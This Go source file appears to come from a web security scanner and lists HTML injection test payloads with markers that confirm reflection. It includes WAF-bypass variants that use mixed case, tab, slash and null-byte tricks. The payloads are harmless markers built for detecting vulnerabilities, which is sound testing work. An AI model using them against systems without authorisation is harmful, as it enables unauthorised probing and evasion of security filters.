package htmlinj

// Payload represents an HTML injection payload.
type Payload struct {
	Value       string
	Marker      string // String to search for in response to confirm injection
	Description string
	WAFBypass   bool
}

// GetPayloads returns standard HTML injection payloads.
func GetPayloads() []Payload {
	return standardPayloads
}

// GetWAFBypassPayloads returns payloads designed to evade WAF filtering.
func GetWAFBypassPayloads() []Payload {
	return wafBypassPayloads
}

// GetAllPayloads returns all HTML injection payloads including WAF bypass variants.
func GetAllPayloads() []Payload {
	all := make([]Payload, 0, len(standardPayloads)+len(wafBypassPayloads))
	all = append(all, standardPayloads...)
	all = append(all, wafBypassPayloads...)
	return all
}

// Standard HTML injection payloads.
// Source: OWASP WSTG-CLNT-03, PayloadsAllTheThings
var standardPayloads = []Payload{
	{
		Value:       "<b>skws</b>",
		Marker:      "<b>skws</b>",
		Description: "Bold tag injection",
	},
	{
		Value:       "<img src=x>",
		Marker:      "<img src=x>",
		Description: "Image tag injection",
	},
	{
		Value:       "<div id=skws>",
		Marker:      "<div id=skws>",
		Description: "Div tag injection with id attribute",
	},
	{
		Value:       "<a href=x>click</a>",
		Marker:      "<a href=x>click</a>",
		Description: "Anchor tag injection",
	},
	{
		Value:       "<h1>skws</h1>",
		Marker:      "<h1>skws</h1>",
		Description: "Heading tag injection",
	},
	{
		Value:       "<iframe src=x>",
		Marker:      "<iframe src=x>",
		Description: "Iframe tag injection",
	},
	{
		Value:       "<marquee>skws</marquee>",
		Marker:      "<marquee>skws</marquee>",
		Description: "Marquee tag injection",
	},
	{
		Value:       `<input type="text" value="skws">`,
		Marker:      `<input type="text" value="skws">`,
		Description: "Input tag injection",
	},
	{
		Value:       "<table><tr><td>skws</td></tr></table>",
		Marker:      "<table><tr><td>skws</td></tr></table>",
		Description: "Table tag injection",
	},
	{
		Value:       "<form action=x><input type=submit></form>",
		Marker:      "<form action=x>",
		Description: "Form tag injection",
	},
}

// WAF bypass HTML injection payloads.
// Source: PayloadsAllTheThings, HackTricks
var wafBypassPayloads = []Payload{
	{
		Value:       "<B>skws</B>",
		Marker:      "<B>skws</B>",
		Description: "Uppercase bold tag bypass",
		WAFBypass:   true,
	},
	{
		Value:       "<iMg SrC=x>",
		Marker:      "<iMg SrC=x>",
		Description: "Mixed case image tag bypass",
		WAFBypass:   true,
	},
	{
		Value:       "<d\tiv id=skws>",
		Marker:      "id=skws>",
		Description: "Tab character in tag name bypass",
		WAFBypass:   true,
	},
	{
		Value:       "<b/skws>test</b>",
		Marker:      "test</b>",
		Description: "Slash separator bypass",
		WAFBypass:   true,
	},
	{
		Value:       "<%00b>skws</b>",
		Marker:      "skws</b>",
		Description: "Null byte in tag name bypass",
		WAFBypass:   true,
	},
}
